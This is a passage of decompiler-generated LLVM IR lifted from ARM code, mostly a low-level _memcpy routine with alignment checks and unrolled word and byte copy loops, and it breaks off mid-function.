dec_label_pc_16fa4.backedge.dec_label_pc_16f50_crit_edge: ; preds = %dec_label_pc_16fa4.backedge
  %v0_16f50.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16f50

dec_label_pc_16fac:                               ; preds = %dec_label_pc_16fa0, %dec_label_pc_16fa4.backedge, %dec_label_pc_16f60, %dec_label_pc_16fa4.preheader, %dec_label_pc_16f88
  %v0_16fac = load i32, i32* @r5, align 4
  %v1_16fac = load i32, i32* @r7, align 4
  %v3_16fac = icmp uge i32 %v0_16fac, %v1_16fac
  store i1 %v3_16fac, i1* %cpsr_c.global-to-local, align 1
  %v9_16fac = icmp eq i32 %v0_16fac, %v1_16fac
  store i1 %v9_16fac, i1* %cpsr_z.global-to-local, align 1
  %v2_16fb0 = xor i1 %v9_16fac, true
  %v3_16fb0 = and i1 %v3_16fac, %v2_16fb0
  br i1 %v3_16fb0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_16fac
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_16fb4 = inttoptr i32 %v0_16fac to i8*
  store i8 0, i8* %v7_16fb4, align 1
  %v0_16fb8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_16fb8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_16fac, %bb
  %v1_16fb8 = phi i1 [ %v1_16fb8.pre, %bb ], [ %v9_16fac, %dec_label_pc_16fac ]
  %v0_16fb8 = phi i1 [ %v0_16fb8.pre, %bb ], [ %v3_16fac, %dec_label_pc_16fac ]
  %v2_16fb8 = xor i1 %v1_16fb8, true
  %v3_16fb8 = and i1 %v0_16fb8, %v2_16fb8
  br i1 %v3_16fb8, label %.dec_label_pc_16fc0_crit_edge, label %dec_label_pc_16fbc

.dec_label_pc_16fc0_crit_edge:                    ; preds = %.thread14
  %v0_16fc0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16fc0

dec_label_pc_16fbc:                               ; preds = %entry, %dec_label_pc_16f88, %.thread14
  br label %dec_label_pc_16fc0

dec_label_pc_16fc0:                               ; preds = %.dec_label_pc_16fc0_crit_edge, %dec_label_pc_16fbc
  %v0_16fc0 = phi i32 [ %v0_16fc0.pre, %.dec_label_pc_16fc0_crit_edge ], [ 0, %dec_label_pc_16fbc ]
  store i32 %v9_16f30, i32* @r6, align 4
  store i32 %v12_16f30, i32* @r7, align 4
  ret i32 %v0_16fc0

; uselistorder directives
  uselistorder i1 %v9_16fac, { 1, 0, 2 }
  uselistorder i32 %v1_16fac, { 1, 0 }
  uselistorder i32 %v0_16fac, { 0, 2, 1 }
  uselistorder i32 %v0_16fa4, { 2, 0, 1 }
  uselistorder i32 %v0_16f9c, { 1, 0 }
  uselistorder i32 %v3_16f78, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16f68, { 1, 0 }
  uselistorder i32 %v3_16f50, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16f74, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16fc0, { 1, 0 }
  uselistorder label %dec_label_pc_16fbc, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_16fac, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_16f50, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_16fd0 = load i32, i32* @r1, align 4
  %v1_16fd0 = load i32, i32* @r0, align 4
  %v2_16fd0 = sub i32 %v0_16fd0, %v1_16fd0
  %v3_16fd0 = icmp ult i32 %v0_16fd0, %v1_16fd0
  %v4_16fd0 = xor i32 %v1_16fd0, %v0_16fd0
  %v5_16fd0 = xor i32 %v2_16fd0, %v0_16fd0
  %v6_16fd0 = and i32 %v5_16fd0, %v4_16fd0
  %v7_16fd0 = icmp slt i32 %v6_16fd0, 0
  store i1 %v7_16fd0, i1* %cpsr_v.global-to-local, align 1
  %v8_16fd0 = icmp slt i32 %v2_16fd0, 0
  store i1 %v8_16fd0, i1* %cpsr_n.global-to-local, align 1
  %v9_16fd0 = icmp eq i32 %v0_16fd0, %v1_16fd0
  store i1 %v9_16fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16fd0, label %dec_label_pc_17224, label %dec_label_pc_16fd8

dec_label_pc_16fd8:                               ; preds = %entry
  br i1 %v9_16fd0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_16fd8
  %merge = phi i32 [ %v0_16fd0, %dec_label_pc_16fd8 ], [ %v2_172b8, %bb150 ], [ %v11_172d4, %bb153 ], [ %v7_172d4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_16fd8
  %v5_16fdc = inttoptr i32 %v1_16fd0 to i8*
  store i8* %v5_16fdc, i8** %stack_var_-8, align 4
  %v8_16fdc = load i32, i32* @lr, align 4
  %v0_16fe0 = load i32, i32* @r2, align 4
  %v2_16fe0 = add i32 %v0_16fe0, -4
  store i32 %v2_16fe0, i32* %r2.global-to-local, align 4
  %v4_16fe0 = sub i32 3, %v0_16fe0
  %v5_16fe0 = and i32 %v4_16fe0, %v0_16fe0
  %v6_16fe0 = icmp slt i32 %v5_16fe0, 0
  store i1 %v6_16fe0, i1* %cpsr_v.global-to-local, align 1
  %v7_16fe0 = icmp slt i32 %v2_16fe0, 0
  store i1 %v7_16fe0, i1* %cpsr_n.global-to-local, align 1
  %v8_16fe0 = icmp eq i32 %v0_16fe0, 4
  store i1 %v8_16fe0, i1* %cpsr_z.global-to-local, align 1
  %v5_16fe4 = icmp slt i32 %v0_16fe0, 4
  br i1 %v5_16fe4, label %bb140, label %dec_label_pc_16fe8

dec_label_pc_16fe8:                               ; preds = %bb
  %v1_16fe8 = urem i32 %v1_16fd0, 4
  store i32 %v1_16fe8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16fe8 = icmp eq i32 %v1_16fe8, 0
  store i1 %v2_16fe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16fe8, label %dec_label_pc_16ff0, label %dec_label_pc_1709c

dec_label_pc_16ff0:                               ; preds = %dec_label_pc_16fe8
  %v1_16ff0 = urem i32 %v0_16fd0, 4
  store i32 %v1_16ff0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16ff0 = icmp eq i32 %v1_16ff0, 0
  store i1 %v2_16ff0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_16fd0 to i2
  br i1 %v2_16ff0, label %dec_label_pc_16ff8, label %dec_label_pc_170cc

dec_label_pc_16ff8:                               ; preds = %dec_label_pc_16ff0, %dec_label_pc_170c4
  %v0_1701094 = phi i32 [ %v1_16fd0, %dec_label_pc_16ff0 ], [ %v0_171ec77, %dec_label_pc_170c4 ]
  %v0_1700c93 = phi i32 [ %v0_16fd0, %dec_label_pc_16ff0 ], [ %v0_170c4, %dec_label_pc_170c4 ]
  %v0_16ff8 = phi i32 [ %v2_16fe0, %dec_label_pc_16ff0 ], [ %v2_170bc, %dec_label_pc_170c4 ]
  %v1_16ff8 = add i32 %v0_16ff8, -8
  store i32 %v1_16ff8, i32* %r2.global-to-local, align 4
  %v3_16ff8 = sub i32 7, %v0_16ff8
  %v4_16ff8 = and i32 %v3_16ff8, %v0_16ff8
  %v5_16ff8 = icmp slt i32 %v4_16ff8, 0
  store i1 %v5_16ff8, i1* %cpsr_v.global-to-local, align 1
  %v6_16ff8 = icmp slt i32 %v1_16ff8, 0
  store i1 %v6_16ff8, i1* %cpsr_n.global-to-local, align 1
  %v7_16ff8 = icmp eq i32 %v0_16ff8, 8
  store i1 %v7_16ff8, i1* %cpsr_z.global-to-local, align 1
  %v2_16ffc = xor i1 %v6_16ff8, %v5_16ff8
  br i1 %v2_16ffc, label %dec_label_pc_1704c, label %dec_label_pc_17000

dec_label_pc_17000:                               ; preds = %dec_label_pc_16ff8
  %v1_17000 = add i32 %v0_16ff8, -28
  store i32 %v1_17000, i32* %r2.global-to-local, align 4
  %v3_17000 = sub i32 27, %v0_16ff8
  %v4_17000 = and i32 %v3_17000, %v1_16ff8
  %v5_17000 = icmp slt i32 %v4_17000, 0
  store i1 %v5_17000, i1* %cpsr_v.global-to-local, align 1
  %v6_17000 = icmp slt i32 %v1_17000, 0
  store i1 %v6_17000, i1* %cpsr_n.global-to-local, align 1
  %v7_17000 = icmp eq i32 %v1_16ff8, 20
  store i1 %v7_17000, i1* %cpsr_z.global-to-local, align 1
  %v2_17004 = xor i1 %v6_17000, %v5_17000
  br i1 %v2_17004, label %dec_label_pc_17038, label %dec_label_pc_17008

dec_label_pc_17008:                               ; preds = %dec_label_pc_17000
  %v0_17008 = load i32, i32* @r4, align 4
  store i32 %v0_17008, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1700c

dec_label_pc_1700c:                               ; preds = %dec_label_pc_1700c.dec_label_pc_1700c_crit_edge, %dec_label_pc_17008
  %v0_17010 = phi i32 [ %v12_17018, %dec_label_pc_1700c.dec_label_pc_1700c_crit_edge ], [ %v0_1701094, %dec_label_pc_17008 ]
  %v0_1700c = phi i32 [ %v0_1700c.pre, %dec_label_pc_1700c.dec_label_pc_1700c_crit_edge ], [ %v0_1700c93, %dec_label_pc_17008 ]
  %v1_1700c = inttoptr i32 %v0_1700c to i32*
  %v2_1700c = load i32, i32* %v1_1700c, align 4
  %v3_1700c = add i32 %v0_1700c, 4
  %v4_1700c = inttoptr i32 %v3_1700c to i32*
  %v5_1700c = load i32, i32* %v4_1700c, align 4
  store i32 %v5_1700c, i32* %r4.global-to-local, align 4
  %v6_1700c = add i32 %v0_1700c, 8
  %v7_1700c = inttoptr i32 %v6_1700c to i32*
  %v8_1700c = load i32, i32* %v7_1700c, align 4
  store i32 %v8_1700c, i32* %ip.global-to-local, align 4
  %v9_1700c = add i32 %v0_1700c, 12
  %v10_1700c = inttoptr i32 %v9_1700c to i32*
  %v11_1700c = load i32, i32* %v10_1700c, align 4
  store i32 %v11_1700c, i32* %lr.global-to-local, align 4
  %v12_1700c = add i32 %v0_1700c, 16
  store i32 %v12_1700c, i32* %r1.global-to-local, align 4
  %v1_17010 = inttoptr i32 %v0_17010 to i32*
  store i32 %v2_1700c, i32* %v1_17010, align 4
  %v3_17010 = add i32 %v0_17010, 4
  %v4_17010 = inttoptr i32 %v3_17010 to i32*
  %v5_17010 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17010, i32* %v4_17010, align 4
  %v6_17010 = add i32 %v0_17010, 8
  %v7_17010 = inttoptr i32 %v6_17010 to i32*
  %v8_17010 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_17010, i32* %v7_17010, align 4
  %v9_17010 = add i32 %v0_17010, 12
  %v10_17010 = inttoptr i32 %v9_17010 to i32*
  %v11_17010 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17010, i32* %v10_17010, align 4
  %v12_17010 = add i32 %v0_17010, 16
  store i32 %v12_17010, i32* %r0.global-to-local, align 4
  %v0_17014 = load i32, i32* %r1.global-to-local, align 4
  %v1_17014 = inttoptr i32 %v0_17014 to i32*
  %v2_17014 = load i32, i32* %v1_17014, align 4
  store i32 %v2_17014, i32* @r3, align 4
  %v3_17014 = add i32 %v0_17014, 4
  %v4_17014 = inttoptr i32 %v3_17014 to i32*
  %v5_17014 = load i32, i32* %v4_17014, align 4
  store i32 %v5_17014, i32* %r4.global-to-local, align 4
  %v6_17014 = add i32 %v0_17014, 8
  %v7_17014 = inttoptr i32 %v6_17014 to i32*
  %v8_17014 = load i32, i32* %v7_17014, align 4
  store i32 %v8_17014, i32* @ip, align 4
  %v9_17014 = add i32 %v0_17014, 12
  %v10_17014 = inttoptr i32 %v9_17014 to i32*
  %v11_17014 = load i32, i32* %v10_17014, align 4
  store i32 %v11_17014, i32* %lr.global-to-local, align 4
  %v12_17014 = add i32 %v0_17014, 16
  store i32 %v12_17014, i32* @r1, align 4
  %v1_17018 = inttoptr i32 %v12_17010 to i32*
  store i32 %v2_17014, i32* %v1_17018, align 4
  %v3_17018 = add i32 %v0_17010, 20
  %v4_17018 = inttoptr i32 %v3_17018 to i32*
  %v5_17018 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17018, i32* %v4_17018, align 4
  %v6_17018 = add i32 %v0_17010, 24
  %v7_17018 = inttoptr i32 %v6_17018 to i32*
  %v8_17018 = load i32, i32* @ip, align 4
  store i32 %v8_17018, i32* %v7_17018, align 4
  %v9_17018 = add i32 %v0_17010, 28
  %v10_17018 = inttoptr i32 %v9_17018 to i32*
  %v11_17018 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17018, i32* %v10_17018, align 4
  %v12_17018 = add i32 %v0_17010, 32
  store i32 %v12_17018, i32* @r0, align 4
  %v0_1701c = load i32, i32* %r2.global-to-local, align 4
  %v1_1701c = add i32 %v0_1701c, -32
  store i32 %v1_1701c, i32* %r2.global-to-local, align 4
  %v3_1701c = sub i32 31, %v0_1701c
  %v4_1701c = and i32 %v3_1701c, %v0_1701c
  %v5_1701c = icmp slt i32 %v4_1701c, 0
  %v6_1701c = icmp slt i32 %v1_1701c, 0
  %v2_17020 = xor i1 %v6_1701c, %v5_1701c
  br i1 %v2_17020, label %dec_label_pc_17024, label %dec_label_pc_1700c.dec_label_pc_1700c_crit_edge

dec_label_pc_1700c.dec_label_pc_1700c_crit_edge:  ; preds = %dec_label_pc_1700c
  %v0_1700c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1700c

dec_label_pc_17024:                               ; preds = %dec_label_pc_1700c
  %v1_17024 = add i32 %v0_1701c, -16
  %v3_17024 = add i32 %v0_1701c, 2147483616
  %v4_17024 = and i32 %v1_17024, %v3_17024
  %v5_17024 = icmp slt i32 %v4_17024, 0
  store i1 %v5_17024, i1* %cpsr_v.global-to-local, align 1
  %v6_17024 = icmp slt i32 %v1_17024, 0
  store i1 %v6_17024, i1* %cpsr_n.global-to-local, align 1
  %v7_17024 = icmp eq i32 %v1_17024, 0
  store i1 %v7_17024, i1* %cpsr_z.global-to-local, align 1
  %v2_17028 = xor i1 %v6_17024, %v5_17024
  br i1 %v2_17028, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_17024
  %v3_17028 = load i32, i32* @r1, align 4
  %v4_17028 = inttoptr i32 %v3_17028 to i32*
  %v5_17028 = load i32, i32* %v4_17028, align 4
  store i32 %v5_17028, i32* @r3, align 4
  %v6_17028 = add i32 %v3_17028, 4
  %v7_17028 = inttoptr i32 %v6_17028 to i32*
  %v8_17028 = load i32, i32* %v7_17028, align 4
  store i32 %v8_17028, i32* %r4.global-to-local, align 4
  %v9_17028 = add i32 %v3_17028, 8
  %v10_17028 = inttoptr i32 %v9_17028 to i32*
  %v11_17028 = load i32, i32* %v10_17028, align 4
  store i32 %v11_17028, i32* @ip, align 4
  %v12_17028 = add i32 %v3_17028, 12
  %v13_17028 = inttoptr i32 %v12_17028 to i32*
  %v14_17028 = load i32, i32* %v13_17028, align 4
  store i32 %v14_17028, i32* %lr.global-to-local, align 4
  %v15_17028 = add i32 %v3_17028, 16
  store i32 %v15_17028, i32* @r1, align 4
  %v4_1702c = inttoptr i32 %v12_17018 to i32*
  store i32 %v5_17028, i32* %v4_1702c, align 4
  %v6_1702c = add i32 %v0_17010, 36
  %v7_1702c = inttoptr i32 %v6_1702c to i32*
  %v8_1702c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1702c, i32* %v7_1702c, align 4
  %v9_1702c = add i32 %v0_17010, 40
  %v10_1702c = inttoptr i32 %v9_1702c to i32*
  %v11_1702c = load i32, i32* @ip, align 4
  store i32 %v11_1702c, i32* %v10_1702c, align 4
  %v12_1702c = add i32 %v0_17010, 44
  %v13_1702c = inttoptr i32 %v12_1702c to i32*
  %v14_1702c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1702c, i32* %v13_1702c, align 4
  %v15_1702c = add i32 %v0_17010, 48
  store i32 %v15_1702c, i32* @r0, align 4
  %v3_17030 = load i32, i32* %r2.global-to-local, align 4
  %v4_17030 = add i32 %v3_17030, -16
  store i32 %v4_17030, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_17024, %bb136
  %v3_17040102111 = phi i32 [ %v15_1702c, %bb136 ], [ %v12_17018, %dec_label_pc_17024 ]
  %v0_17038.pre = phi i32 [ %v4_17030, %bb136 ], [ %v1_1701c, %dec_label_pc_17024 ]
  %v2_17034 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17034, i32* @r4, align 4
  br label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %dec_label_pc_17000, %bb137
  %v3_17040101 = phi i32 [ %v0_1701094, %dec_label_pc_17000 ], [ %v3_17040102111, %bb137 ]
  %v0_17038 = phi i32 [ %v1_17000, %dec_label_pc_17000 ], [ %v0_17038.pre, %bb137 ]
  %v1_17038 = add i32 %v0_17038, 20
  store i32 %v1_17038, i32* %r2.global-to-local, align 4
  %v3_17038 = sub i32 0, %v0_17038
  %v4_17038 = and i32 %v1_17038, %v3_17038
  %v5_17038 = icmp slt i32 %v4_17038, 0
  store i1 %v5_17038, i1* %cpsr_v.global-to-local, align 1
  %v6_17038 = icmp slt i32 %v1_17038, 0
  store i1 %v6_17038, i1* %cpsr_n.global-to-local, align 1
  %v7_17038 = icmp eq i32 %v1_17038, 0
  store i1 %v7_17038, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1703c

dec_label_pc_1703c:                               ; preds = %.thread115, %dec_label_pc_17038
  %v0_1704c.pre157 = phi i32 [ %v0_1704c.pre, %.thread115 ], [ %v1_17038, %dec_label_pc_17038 ]
  %v3_17040 = phi i32 [ %v3_1704099116, %.thread115 ], [ %v3_17040101, %dec_label_pc_17038 ]
  %v1_17044 = phi i1 [ %v1_17048, %.thread115 ], [ %v5_17038, %dec_label_pc_17038 ]
  %v0_17044 = phi i1 [ %v0_17048, %.thread115 ], [ %v6_17038, %dec_label_pc_17038 ]
  %v2_1703c = xor i1 %v1_17044, %v0_17044
  br i1 %v2_1703c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1703c
  %v3_1703c = load i32, i32* @r1, align 4
  %v4_1703c = inttoptr i32 %v3_1703c to i32*
  %v5_1703c = load i32, i32* %v4_1703c, align 4
  store i32 %v5_1703c, i32* @r3, align 4
  %v6_1703c = add i32 %v3_1703c, 4
  %v7_1703c = inttoptr i32 %v6_1703c to i32*
  %v8_1703c = load i32, i32* %v7_1703c, align 4
  store i32 %v8_1703c, i32* @ip, align 4
  %v9_1703c = add i32 %v3_1703c, 8
  %v10_1703c = inttoptr i32 %v9_1703c to i32*
  %v11_1703c = load i32, i32* %v10_1703c, align 4
  store i32 %v11_1703c, i32* %lr.global-to-local, align 4
  %v12_1703c = add i32 %v3_1703c, 12
  store i32 %v12_1703c, i32* @r1, align 4
  %v4_17040 = inttoptr i32 %v3_17040 to i32*
  store i32 %v5_1703c, i32* %v4_17040, align 4
  %v6_17040 = add i32 %v3_17040, 4
  %v7_17040 = inttoptr i32 %v6_17040 to i32*
  %v8_17040 = load i32, i32* @ip, align 4
  store i32 %v8_17040, i32* %v7_17040, align 4
  %v9_17040 = add i32 %v3_17040, 8
  %v10_17040 = inttoptr i32 %v9_17040 to i32*
  %v11_17040 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17040, i32* %v10_17040, align 4
  %v12_17040 = add i32 %v3_17040, 12
  store i32 %v12_17040, i32* @r0, align 4
  %v3_17044 = load i32, i32* %r2.global-to-local, align 4
  %v4_17044 = add i32 %v3_17044, -12
  store i32 %v4_17044, i32* %r2.global-to-local, align 4
  %v6_17044 = sub i32 11, %v3_17044
  %v7_17044 = and i32 %v6_17044, %v3_17044
  %v8_17044 = icmp slt i32 %v7_17044, 0
  store i1 %v8_17044, i1* %cpsr_v.global-to-local, align 1
  %v9_17044 = icmp slt i32 %v4_17044, 0
  store i1 %v9_17044, i1* %cpsr_n.global-to-local, align 1
  %v10_17044 = icmp eq i32 %v3_17044, 12
  store i1 %v10_17044, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1703c, %bb138
  %v0_1704c.pre = phi i32 [ %v4_17044, %bb138 ], [ %v0_1704c.pre157, %dec_label_pc_1703c ]
  %v3_1704099116 = phi i32 [ %v12_17040, %bb138 ], [ %v3_17040, %dec_label_pc_1703c ]
  %v1_17048 = phi i1 [ %v8_17044, %bb138 ], [ %v1_17044, %dec_label_pc_1703c ]
  %v0_17048 = phi i1 [ %v9_17044, %bb138 ], [ %v0_17044, %dec_label_pc_1703c ]
  %v2_17048 = xor i1 %v1_17048, %v0_17048
  br i1 %v2_17048, label %dec_label_pc_1704c, label %dec_label_pc_1703c

dec_label_pc_1704c:                               ; preds = %.thread115, %dec_label_pc_16ff8
  %v4_1705c = phi i32 [ %v0_1701094, %dec_label_pc_16ff8 ], [ %v3_1704099116, %.thread115 ]
  %v0_1704c = phi i32 [ %v1_16ff8, %dec_label_pc_16ff8 ], [ %v0_1704c.pre, %.thread115 ]
  %v1_1704c = add i32 %v0_1704c, 8
  store i32 %v1_1704c, i32* %r2.global-to-local, align 4
  %v3_1704c = sub i32 0, %v0_1704c
  %v4_1704c = and i32 %v1_1704c, %v3_1704c
  %v5_1704c = icmp slt i32 %v4_1704c, 0
  store i1 %v5_1704c, i1* %cpsr_v.global-to-local, align 1
  %v6_1704c = icmp slt i32 %v1_1704c, 0
  store i1 %v6_1704c, i1* %cpsr_n.global-to-local, align 1
  %v7_1704c = icmp eq i32 %v1_1704c, 0
  store i1 %v7_1704c, i1* %cpsr_z.global-to-local, align 1
  %v2_17050 = xor i1 %v6_1704c, %v5_1704c
  br i1 %v2_17050, label %bb140, label %dec_label_pc_17054

dec_label_pc_17054:                               ; preds = %dec_label_pc_1704c
  %v1_17054 = add i32 %v0_1704c, 4
  store i32 %v1_17054, i32* %r2.global-to-local, align 4
  %v3_17054 = sub i32 -5, %v0_1704c
  %v4_17054 = and i32 %v3_17054, %v1_1704c
  %v5_17054 = icmp slt i32 %v4_17054, 0
  store i1 %v5_17054, i1* %cpsr_v.global-to-local, align 1
  %v6_17054 = icmp slt i32 %v1_17054, 0
  store i1 %v6_17054, i1* %cpsr_n.global-to-local, align 1
  %v7_17054 = icmp eq i32 %v1_1704c, 4
  store i1 %v7_17054, i1* %cpsr_z.global-to-local, align 1
  %v2_17058 = xor i1 %v6_17054, %v5_17054
  %v3_17058 = load i32, i32* @r1, align 4
  %v4_17058 = inttoptr i32 %v3_17058 to i32*
  %v5_17058 = load i32, i32* %v4_17058, align 4
  store i32 %v5_17058, i32* @r3, align 4
  %v7_17058 = add i32 %v3_17058, 4
  br i1 %v2_17058, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_17054
  store i32 %v7_17058, i32* @r1, align 4
  %v5_1705c = inttoptr i32 %v4_1705c to i32*
  store i32 %v5_17058, i32* %v5_1705c, align 4
  %v6_1705c = load i32, i32* @r0, align 4
  %v7_1705c = add i32 %v6_1705c, 4
  store i32 %v7_1705c, i32* @r0, align 4
  %v0_1706c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_17054
  %v7_17060 = inttoptr i32 %v7_17058 to i32*
  %v8_17060 = load i32, i32* %v7_17060, align 4
  store i32 %v8_17060, i32* @ip, align 4
  %v9_17060 = add i32 %v3_17058, 8
  store i32 %v9_17060, i32* @r1, align 4
  %v4_17064 = inttoptr i32 %v4_1705c to i32*
  store i32 %v5_17058, i32* %v4_17064, align 4
  %v6_17064 = add i32 %v4_1705c, 4
  %v7_17064 = inttoptr i32 %v6_17064 to i32*
  %v8_17064 = load i32, i32* @ip, align 4
  store i32 %v8_17064, i32* %v7_17064, align 4
  %v9_17064 = add i32 %v4_1705c, 8
  store i32 %v9_17064, i32* @r0, align 4
  %v3_17068 = load i32, i32* %r2.global-to-local, align 4
  %v4_17068 = add i32 %v3_17068, -4
  store i32 %v4_17068, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1704c, %bb, %dec_label_pc_1721c, %dec_label_pc_171b0, %dec_label_pc_17144, %bb139
  %v0_1706c = phi i32 [ %v0_1706c.pre, %.thread122 ], [ %v2_170bc, %.thread128 ], [ %v1_1704c, %dec_label_pc_1704c ], [ %v2_16fe0, %bb ], [ %v0_1706c61, %dec_label_pc_1721c ], [ %v0_1706c60, %dec_label_pc_171b0 ], [ %v0_1706c59, %dec_label_pc_17144 ], [ %v4_17068, %bb139 ]
  %v1_1706c = add i32 %v0_1706c, 4
  store i32 %v1_1706c, i32* %r2.global-to-local, align 4
  %v3_1706c = sub i32 0, %v0_1706c
  %v4_1706c = and i32 %v1_1706c, %v3_1706c
  %v5_1706c = icmp slt i32 %v4_1706c, 0
  store i1 %v5_1706c, i1* %cpsr_v.global-to-local, align 1
  %v6_1706c = icmp slt i32 %v1_1706c, 0
  store i1 %v6_1706c, i1* %cpsr_n.global-to-local, align 1
  %v7_1706c = icmp eq i32 %v1_1706c, 0
  store i1 %v7_1706c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1706c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_17074.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_17070 = load i8*, i8** %stack_var_-8, align 4
  %v4_17070 = ptrtoint i8* %v3_17070 to i32
  store i32 %v4_17070, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_17074 = phi i32 [ %v0_17074.pre, %bb140.bb142_crit_edge ], [ %v8_16fdc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1706c, i32 %v0_17074)
  %v0_17078 = load i32, i32* %r2.global-to-local, align 4
  %v1_17078 = add i32 %v0_17078, -2
  %v3_17078 = sub i32 1, %v0_17078
  %v4_17078 = and i32 %v3_17078, %v0_17078
  %v5_17078 = icmp slt i32 %v4_17078, 0
  store i1 %v5_17078, i1* %cpsr_v.global-to-local, align 1
  %v6_17078 = icmp slt i32 %v1_17078, 0
  store i1 %v6_17078, i1* %cpsr_n.global-to-local, align 1
  %v7_17078 = icmp eq i32 %v0_17078, 2
  store i1 %v7_17078, i1* %cpsr_z.global-to-local, align 1
  %v0_1707c = load i32, i32* @r1, align 4
  %v1_1707c = inttoptr i32 %v0_1707c to i8*
  %v2_1707c = load i8, i8* %v1_1707c, align 1
  %v5_1707c = add i32 %v0_1707c, 1
  store i32 %v5_1707c, i32* %r1.global-to-local, align 4
  %v2_17080 = load i32, i32* @r0, align 4
  %v3_17080 = inttoptr i32 %v2_17080 to i8*
  store i8 %v2_1707c, i8* %v3_17080, align 1
  %v4_17080 = load i32, i32* @r0, align 4
  %v5_17080 = add i32 %v4_17080, 1
  store i32 %v5_17080, i32* %r0.global-to-local, align 4
  %v0_17084 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17084 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17084 = xor i1 %v0_17084, %v1_17084
  br i1 %v2_17084, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_17084 = load i32, i32* %r1.global-to-local, align 4
  %v4_17084 = inttoptr i32 %v3_17084 to i8*
  %v5_17084 = load i8, i8* %v4_17084, align 1
  %v8_17084 = add i32 %v3_17084, 1
  store i32 %v8_17084, i32* %r1.global-to-local, align 4
  %v6_17088 = inttoptr i32 %v5_17080 to i8*
  store i8 %v5_17084, i8* %v6_17088, align 1
  %v7_17088 = load i32, i32* %r0.global-to-local, align 4
  %v8_17088 = add i32 %v7_17088, 1
  store i32 %v8_17088, i32* %r0.global-to-local, align 4
  %v1_1708c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1708c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_17090 = phi i32 [ %v8_17088, %bb143 ], [ %v5_17080, %bb142 ]
  %v2_17090 = phi i1 [ %v2_1708c.pre, %bb143 ], [ %v1_17084, %bb142 ]
  %v1_17090 = phi i1 [ %v1_1708c.pre, %bb143 ], [ %v0_17084, %bb142 ]
  %v0_1708c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1708c = xor i1 %v2_17090, %v1_17090
  %v4_1708c = or i1 %v0_1708c, %v3_1708c
  br i1 %v4_1708c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
